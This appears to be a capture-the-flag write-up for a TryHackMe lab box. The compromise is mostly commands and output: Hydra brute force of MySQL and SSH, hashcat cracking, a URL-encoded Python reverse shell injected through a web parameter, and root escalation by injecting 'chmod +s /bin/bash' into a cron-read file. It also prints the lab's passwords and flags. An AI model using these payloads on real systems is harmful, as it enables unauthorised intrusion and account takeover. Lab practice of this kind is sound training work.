<p>July 13, 2025</p>
<h1>Brute</h1>
<p>You as well, Brutus?</p>
<p>https://tryhackme.com/room/ettubrute</p>

<br>

<img width="1899" height="386" alt="image" src="https://github.com/user-attachments/assets/75972a08-9c29-4d86-a27c-a25976dd514e" />

<br>

<h2>Task 1 . What is the root and user flag?</h2>

<h3>rustcan</h3>

```bash
:~/Brute# rustscan -a 10.10.4.197 --ulimit 5500 -b 65535 -- -A -Pn
...
PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 3.0.5
22/tcp   open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
3306/tcp open  nagios-nsca syn-ack Nagios NSCA
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.41-0ubuntu0.20.04.1
|   Thread ID: 13
|   Capabilities flags: 65535
|   Some Capabilities: ConnectWithDatabase, Support41Auth, Speaks41ProtocolNew, InteractiveClient, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, FoundRows, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, SupportsCompression, SwitchToSSLAfterHandshake, LongPassword, SupportsTransactions, SupportsLoadDataLocal, ODBCClient, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: o8t	wV!>\x1B1\x1F*\x15z=(\x0BO4\x05
|_  Auth Plugin Name: caching_sha2_password
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

<h3>nmap</h3>

```bash
:~/Brute# nmap --script mysql-enum -sV -p 3306 -Pn 10.10.4.197
...
PORT     STATE SERVICE     VERSION
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0

```



<h3>hydra</h3>

```bash
:~/Brute# hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.4.197 mysql -V -t 64
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
...
[3306][mysql] host: 10.10.4.197   login: root   password: rockyou
1 of 1 target successfully completed, 1 valid password found
...
```

```bash
:~/Brute#  sudo apt update
...
:~/Brute#  sudo apt install mysql-server
...
:~/Brute# sudo systemctl start mysql.service
:~/Brute# mysql -h 10.10.4.197 -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 92
Server version: 8.0.41-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| website            |
+--------------------+
5 rows in set (0.00 sec)

mysql> use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_website |
+-------------------+
| users             |
+-------------------+
1 row in set (0.00 sec)

mysql> describe users;
+------------+--------------+------+-----+-------------------+-------------------+
| Field      | Type         | Null | Key | Default           | Extra             |
+------------+--------------+------+-----+-------------------+-------------------+
| id         | int          | NO   | PRI | NULL              | auto_increment    |
| username   | varchar(50)  | NO   | UNI | NULL              |                   |
| password   | varchar(255) | NO   |     | NULL              |                   |
| created_at | datetime     | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED |
+------------+--------------+------+-----+-------------------+-------------------+
4 rows in set (0.01 sec)

mysql> select username, password from users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| Adrian   | $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we |
+----------+--------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> 
```

```bash
:~/Brute# hashcat -m 3200 -a 0 hash /usr/share/wordlists/rockyou.txt -o hashadrian
...
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSY...SKn4we
Time.Started.....: Sun Jul 13 05:24:08 2025 (1 sec)
Time.Estimated...: Sun Jul 13 05:24:09 2025 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       22 H/s (11.24ms) @ Accel:2 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 28/14344384 (0.00%)
Rejected.........: 0/28 (0.00%)
Restore.Point....: 24/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:960-1024
Candidates.#1....: tigger -> password1
:~/Brute# hashcat -m 3200 -a 0 hash --show
:~/Brute# $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we:tigger
```

<img width="1118" height="227" alt="image" src="https://github.com/user-attachments/assets/54a9f3ea-312f-48b6-8f16-5bf033968603" />

<img width="1105" height="215" alt="image" src="https://github.com/user-attachments/assets/48dca7ee-42be-4d5f-94f6-29b357ddb1c3" />

<img width="1128" height="266" alt="image" src="https://github.com/user-attachments/assets/1f84cb89-80c6-48c4-865f-dac2023c300f" />

```bash
ftp 10.10.4.197
Connected to 10.10.4.197.
220 (vsFTPd 3.0.5)
Name (10.10.4.197:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> exit
221 Goodbye.
```


```bash
nc -vn 10.10.4.197 21
Connection to 10.10.4.197 21 port [tcp/*] succeeded!
220 (vsFTPd 3.0.5)
whoami
530 Please login with USER and PASS.
```

<h3>TargetIP/elcome.php?x=id</h3>

<img width="1107" height="226" alt="image" src="https://github.com/user-attachments/assets/6be68cb2-68f4-493d-aa22-af466563915e" />

```bash
http://10.10.4.197/welcome.php?x=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.178.72%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22bash%22)%27
```


```bash
nc -nlvp 4444
...
www-data@ip-10-10-4-197:/var/www/html$ which python3
which python3
/usr/bin/python3
www-data@ip-10-10-4-197:/var/www/html$ ls
ls
config.php  index.php  logout.php  welcome.php
ww-data@ip-10-10-4-197:/home/adrian$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ian$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ip-10-10-4-197:/home/adrian$ ^Z
[1]+  Stopped                 nc -nlvp 4444
:~# stty raw -echo; fg
nc -nlvp 4444
www-data@ip-10-10-4-197:/var/www/html$ ls
config.php  index.php  logout.php  welcome.php
www-data@ip-10-10-4-197:/var/www/html$ cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'adrian');
define('DB_PASSWORD', 'P@sswr0d789!');
define('DB_NAME', 'website');
```


```bash
www-data@ip-10-10-4-197:/home/adrian$ cat .reminder
Rules:
best of 64
+ exclamation

ettubrute
www-data@ip-10-10-4-197:/home/adrian$ 
```


```bash
:~# echo 'ettubrute' > pass.txt
:~# echo '$!' > append.txtcat hash
:~# locate best64
/opt/hashcat/rules/best64.rule
/opt/john/rules/best64.rule
:~# hashcat --stdout pass.txt -r /usr/local/share/doc/hashcat/rules/best64.rule -r append.txt > hashcat_list.txt
cat hashcat_list.txt | wc -l
77
:~# cat hashcat_list.txt
ettubrute!
eturbutte!
ETTUBRUTE!
Ettubrute!
ettubrute0!
ettubrute1!
ettubrute2!
ettubrute3!
ettubrute4!
ettubrute5!
ettubrute6!
ettubrute7!
ettubrute8!
ettubrute9!
ettubrute00!
...
:~# hydra -l adrian -P hashcat_list.txt 10.10.4.197 ssh -V -t 6
...
[22][ssh] host: 10.10.4.197   login: adrian   password: theettubrute!
....
:~# john --rules=best64 --wordlist=pass.txt --stdout > john_list.txt
...
:~# cat john_list.txt | wc -l
76
:~# sed -i 's/$/!/' john_list.txt 
:~# cat john_list.txt | grep the
theettubrute!
...
:~# ssh adrian@10.10.4.197
...
adrian@ip-10-10-4-197:~$ cat /home/adrian/user.txt
THM{PoI$0n_tH@t_L0g}
```



```bash
:~$ cat punch_in.sh
#!/bin/bash

/usr/bin/echo 'Punched in at '$(/usr/bin/date +"%H:%M") >> /home/adrian/punch_in
```

```bash
:~/ftp/files$ cat script
#!/bin/sh
while read line;
do
  /usr/bin/sh -c "echo $line";
done < /home/adrian/punch_in
```

```bash
:~/ftp/files$ cat .notes
That silly admin
He is such a micro manager, wants me to check in every minute by writing
on my punch card.

He even asked me to write the script for him.

Little does he know, I am planning my revenge.
```

```bash
:~/ftp/files$ wget http://10.10.178.72:8000/pspy64
...

pspy64                              100%[===================================================================>]   2.94M  --.-KB/s    in 0.01s   
...

adrian@ip-10-10-4-197:~/ftp/files$ chmod +x pspy64


2025/07/13 05:06:24 CMD: UID=113  PID=1095   | /usr/sbin/mysqld 
2025/07/13 05:06:24 CMD: UID=0    PID=101    | 
2025/07/13 05:06:24 CMD: UID=0    PID=100    | 
2025/07/13 05:06:24 CMD: UID=0    PID=10     | 
2025/07/13 05:06:24 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
2025/07/13 05:07:01 CMD: UID=0    PID=5649   | /usr/sbin/CRON -f 
2025/07/13 05:07:01 CMD: UID=0    PID=5648   | /usr/sbin/cron -f 
2025/07/13 05:07:01 CMD: UID=0    PID=5647   | /usr/sbin/CRON -f 
2025/07/13 05:07:01 CMD: UID=0    PID=5650   | /bin/sh -c /usr/bin/mysql -h localhost -u root -p'SuperSqlP@ss3' -e 'flush hosts;' 
2025/07/13 05:07:01 CMD: UID=0    PID=5653   | /bin/sh -c /usr/bin/mysql -h localhost -u root -p'SuperSqlP@ss3' -e 'flush hosts;' 
2025/07/13 05:07:01 CMD: UID=0    PID=5652   | /usr/sbin/CRON -f 
2025/07/13 05:07:01 CMD: UID=1000 PID=5654   | /bin/sh -c /usr/bin/bash /home/adrian/punch_in.sh 
2025/07/13 05:07:01 CMD: UID=0    PID=5655   | /usr/sbin/CRON -f 
2025/07/13 05:07:01 CMD: UID=0    PID=5656   | /etc/badr/badr --config /etc/badr/rules.yaml --config /etc/badr/room.config.yaml > /var/log/badr.log 2>&1 
2025/07/13 05:07:01 CMD: UID=1000 PID=5658   | /usr/bin/bash /home/adrian/punch_in.sh 
```


```bash
adrian@ip-10-10-4-197:~$ echo ";chmod +s /bin/bash" >> punch_in
adrian@ip-10-10-4-197:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
adrian@ip-10-10-4-197:~$ /bin/bash -p
bash-5.0# id
uid=1000(adrian) gid=1000(adrian) euid=0(root) groups=1000(adrian)
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
check_in.sh  root.txt  snap
bash-5.0# cat root.txt
THM{C0mm@nD_Inj3cT1on_4_D@_BruT3}
bash-5.0#
```

<br>
<br>


<img width="1901" height="883" alt="image" src="https://github.com/user-attachments/assets/ccd43985-e49e-4e68-b77f-9537ce372095" />

<img width="1909" height="898" alt="image" src="https://github.com/user-attachments/assets/9dadbd77-da3f-4b96-b99c-e9bbf27550df" />


<br>
<br>

<img width="1893" height="896" alt="image" src="https://github.com/user-attachments/assets/1146f3c4-5f95-40e1-b9ed-50ef551dc97d" />

<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/c5327e0c-90b3-42bd-9d82-5b3902420590" />

<img width="428" height="280" alt="image" src="https://github.com/user-attachments/assets/7c1bb886-4d05-424a-9ac7-96e853bc5691" />

<img width="1886" height="884" alt="image" src="https://github.com/user-attachments/assets/279a025a-10f7-475c-8123-901892d805bf" />

<img width="1884" height="889" alt="image" src="https://github.com/user-attachments/assets/e61a4073-005d-451e-a038-ba3e560a62e6" />

<img width="1884" height="901" alt="image" src="https://github.com/user-attachments/assets/3e4e1e81-e447-4989-a5ed-9315ac50efb2" />





